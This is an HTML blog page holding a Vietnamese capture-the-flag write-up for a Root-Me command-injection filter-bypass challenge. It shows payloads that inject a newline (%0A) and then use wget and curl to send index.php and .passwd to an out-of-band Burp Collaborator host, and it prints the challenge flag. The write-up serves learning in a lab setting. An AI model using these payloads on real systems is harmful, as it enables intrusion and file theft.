@@ -1,0 +1,193 @@
+<!DOCTYPE html>
+    <html lang="en">
+    <head>
+    <meta charset="utf-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, viewport-fit=cover">
+    <title>Blog - CTF</title>
+    <meta name="author" content="LBT" />
+    <meta name="description" content="You think you understand something until you try to teach it">
+    <link rel="alternate" type="application/rss+xml" title="Blog - CTF" href="/feed.xml" />
+    <!-- Favicon head tag -->
+    <link rel="shortcut icon" type="image/png" href="../../img/Artboard 1.png" >
+    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-137982391-1"></script>
+    <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+        gtag('js', new Date());
+        gtag('config', 'UA-137982391-1');
+    </script>
+    <!-- Google Analytics -->
+    <script>
+      (function (i, s, o, g, r, a, m) {
+          i['GoogleAnalyticsObject'] = r; i[r] = i[r] || function () {
+            (i[r].q = i[r].q || []).push(arguments)
+          }, i[r].l = 1 * new Date(); a = s.createElement(o),
+            m = s.getElementsByTagName(o)[0]; a.async = 1; a.src = g; m.parentNode.insertBefore(a, m)
+      })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
+      ga('create', 'UA-137982391-1', 'auto');
+      ga('send', 'pageview');
+    </script>
+    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css" />
+    <link rel="stylesheet" href="../../css/bootstrap.min.css" />
+    <link rel="stylesheet" href="../../css/bootstrap-social.css" />
+    <link rel="stylesheet" href="../../css/main.css" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lora:400,700,400italic,700italic" />
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:300italic,400italic,600italic,700italic,800italic,400,300,600,700,800" />
+    <!-- Facebook OpenGraph tags -->
+    <meta property="og:title" content="Blog" />
+    <meta property="og:description" content="You think you understand something until you try to teach it">
+    <meta property="og:type" content="website" />
+    <meta property="og:url" content="https://lebathanh1308.github.io/Project_sec1" />
+    <link rel="canonical" href="https://lebathanh1308.github.io/Project_sec1" />
+    <meta property="og:image" content="https://lebathanh1308.github.io/Project_sec1/img/avatar-icon.png" />
+    <!-- Twitter summary cards -->
+    <meta name="twitter:card" content="summary" />
+    <meta name="twitter:site" content="@" />
+    <meta name="twitter:creator" content="@" />
+    <meta name="twitter:title" content="Blog" />
+    <meta name="twitter:description" content="You think you understand something until you try to teach it">
+    <meta name="twitter:image" content="https://lebathanh1308.github.io/Project_sec1/img/avatar-icon.png" />
+    <!--SEO tag testing-->
+    <!-- Begin Jekyll SEO tag v2.6.1 -->
+    <meta name="generator" content="Jekyll v3.9.0" />
+    <meta property="og:title" content="Blog" />
+    <meta name="author" content="LBT" />
+    <meta property="og:locale" content="en_US" />
+    <meta name="description" content="Web" />
+    <meta property="og:description" content="Web" />
+    <link rel="canonical" href="https://lebathanh1308.github.io/Project_sec1" />
+    <meta property="og:url" content="https://lebathanh1308.github.io/Project_sec1" />
+    <meta property="og:site_name" content="Blog - CTF" />
+    <script type="application/ld+json">
+      {"headline":"Blog","@type":"WebSite","author":{"@type":"Person","name":"LBT"},"url":"https://lebathanh1308.github.io/Project_sec1","description":"Web","name":"Blog - CTF","@context":"https://schema.org"}</script>
+    <!-- End Jekyll SEO tag -->
+</head>
+  <body>
+    <nav class="navbar navbar-default navbar-fixed-top navbar-custom">
+        <div class="container-fluid">
+          <div class="navbar-header">
+            <button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#main-navbar">
+              <span class="sr-only">Toggle navigation</span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+              <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand navbar-brand-logo" href="https://lebathanh1308.github.io/Project_sec1"><img src="../../img/Artboard 1.png"/></a>   
+          </div>
+          <div class="collapse navbar-collapse" id="main-navbar">
+            <ul class="nav navbar-nav navbar-right">
+              <li>
+                  <a href="/categories">Capture The Flag</a>
+              </li>
+            </ul>
+          </div>
+          <div class="avatar-container">
+              <div class="avatar-img-border">
+                <a href="https://lebathanh1308.github.io/Project_sec1">
+                  <img class="avatar-img" src="../../img/avatar-icon.png" />
+                  </a>
+              </div>
+            </div>
+        </div>
+    </nav>
+    <header class="header-section ">
+        <div class="intro-header no-img">
+          <div class="container">
+            <div class="row">
+              <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                  <h1>Command injection - Filter bypass</h1>
+                  <span class="post-meta">Posted on March 27, 2024</span>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+    </header>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <article role="main" class="blog-post">
+                    <h2 id="english-below">[WRITE - UP]</h2>     
+                        <p><a href="http://challenge01.root-me.org/web-serveur/ch53/">Link challenge</a>    
+                      <p>Trước hết <strong>OS Command Injection</strong> hay còn gọi là <strong>Shell Injection</strong> là một lỗ hổng bảo mật web cho phép kẻ tấn công có thể thực thi các lệnh hệ thống trên máy chủ đó khi đang chạy 1 dịch vụ nào đó.</p>      
+                      <p>Trước kia mình đã từng làm 1 số bài tương tự nhưng ở bài này challenge đã Filter, mình đã thử 1 vài payload đơn giản <strong>|, &, ;</strong> nhưng kết quả đều là Syntax Error.</p>
+                      <p>Nhưng nếu mình thử với payload <strong>||, &&</strong> thì kết quả là Ping OK, có thể challenge hiểu rằng đây là các toán tử logic được sử dụng trong các câu lệnh shell để kiểm soát việc thực thi các lệnh nên không báo lỗi. Sau 1 thời gian Google mình tìm được payload giúp mình Bypass được Filter của challenge này, đó là <strong>%0A</strong> là mã trình bày cho dòng mới (newline) trong mã URL được mã hóa.</p>
+                      <p>Mình thử confim xem có Bypass được không bằng payload sau</p>
+                      <p class="box-note">127.0.0.1%0Awget 6elzng53a7xd45j1x8yxgpni89ez2o.oastify.com</p>
+                      <p><img src="../../img/cm.png" alt="cm.PNG" /></p> 
+                      <p>Mình sử dụng <strong>wget</strong> để trích xuất dữ liệu và nội dung từ challenge, ở đây mình dùng <strong>Burp Collaborator Cilent</strong></p>
+                      <p><img src="../../img/cm1.png" alt="cm.PNG" /></p> 
+                      <p>Ban đầu mình nghĩ vậy là đã Command Injection được rồi, sau đó chỉ ls thư mục ra nhưng mà không ls, cat đều không tìm thấy được gì</p>
+                      <p>Sau 1 hồi thử với thử hết payload của CURL đều không được, nên mình thử đọc trong file <strong>index.php</strong> xem có gì không đồng thời gửi kèm địa chỉ của <strong>Burp Collaborator</strong> vào payload</p>
+                      <p class="box-note">127.0.0.1%0Acurl -X POST -F file=@index.php 6elzng53a7xd45j1x8yxgpni89ez2o.oastify.com</p>
+                      <p>Trong đó:
+                        <li><strong>curl:</strong> để thực hiện một cuộc gọi HTTP POST. Lệnh curl được sử dụng để truy xuất các tài nguyên từ các URL bằng giao thức HTTP hoặc HTTPS.</li>
+                        <li><strong>-X POST:</strong> chỉ định rằng cuộc gọi HTTP sẽ được thực hiện bằng phương thức POST</li>
+                        <li><strong>-F:</strong> để gửi dữ liệu biểu mẫu với yêu cầu, ở đây là file=@index.php để chỉ định tập tin index.php trong dữ liệu biểu mẫu.</li>
+                      </p>
+                      <p><img src="../../img/cm2.png" alt="cm.PNG" /></p>
+                      <p>Bất ngờ mình đã thấy được source code, có thể thấy Flag không nằm trong file <strong>index.php</strong> mà nằm trong file <strong>passwd</strong></p>
+                      <p>Giờ thì đọc file <strong>passwd</strong> và lấy Flag thôi.</p>
+                      <p class="box-note">127.0.0.1%0Acurl -X POST -F file=@.passwd 6elzng53a7xd45j1x8yxgpni89ez2o.oastify.com</p>
+                      <p><img src="../../img/cm3.png" alt="cm.png" /></p>
+                      <p class="box-note">Flag: Comma@nd_1nJec7ion_Fl@9_1337_Th3_G@m3!!!</p>
+              </article>
+            </div>
+        </div>
+    </div>
+  <footer>
+    <div class="container beautiful-jekyll-footer">
+      <div class="row">
+        <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+          <ul class="list-inline text-center footer-links">
+            <li>
+              <a href="lebathanh1308@gmail.com" title="Email me">
+                <span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-envelope fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">Email me</span>
+              </a>
+            </li>
+  
+            <li><a href="https://www.facebook.com/le.bathanh.338?locale=vi_VN" title="Facebook"><span class="fa-stack fa-lg" aria-hidden="true">
+                    <i class="fa fa-circle fa-stack-2x"></i>
+                    <i class="fa fa-facebook fa-stack-1x fa-inverse"></i>
+                  </span>
+                  <span class="sr-only">Facebook</span>
+                </a>
+            </li>
+              
+            <li>
+              <a href="https://lebathanh1308.github.com" title="GitHub">
+                <span class="fa-stack fa-lg" aria-hidden="true">
+                  <i class="fa fa-circle fa-stack-2x"></i>
+                  <i class="fa fa-github fa-stack-1x fa-inverse"></i>
+                </span>
+                <span class="sr-only">GitHub</span>
+              </a>
+            </li>
+          </ul>
+          <p class="copyright text-muted">Le Ba Thanh&nbsp;&bull;&nbsp;2024</p>
+            <!-- Please don't remove this, keep my open source work credited :) -->
+        </div>
+      </div>
+    </div>
+  </footer>
+              <script>
+                if (typeof jQuery == 'undefined') {
+                  document.write('<script src="../../js/jquery-1.11.2.min.js"></scr' + 'ipt>');
+                }
+            </script>
+          
+        
+          <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+          
+          <script src="../../js/bootstrap.min.js"></script>
+          
+        
+          <!-- doing something a bit funky here because I want to be careful not to include JQuery twice! -->
+          
+          <script src="../../js/main.js"></script>
